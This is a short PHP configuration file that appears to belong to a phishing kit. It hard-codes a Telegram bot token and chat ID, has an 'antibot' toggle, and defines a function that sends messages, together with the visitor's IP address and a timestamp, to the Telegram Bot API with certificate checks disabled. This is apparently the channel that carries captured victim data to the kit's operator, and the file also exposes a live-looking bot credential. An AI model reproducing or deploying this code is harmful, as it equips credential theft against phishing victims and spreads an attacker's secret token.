<?php 
$token = "7950895908:AAH0njpDnSFQ0uOn_DQ26Q0vSKoEGKX5HCk";
$id = "-5569031468";

// use antibot? yes|no
$antibot = "yes";



function call($msg){
    global $token;
    global $id;
    $info = "

/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}
 


?>
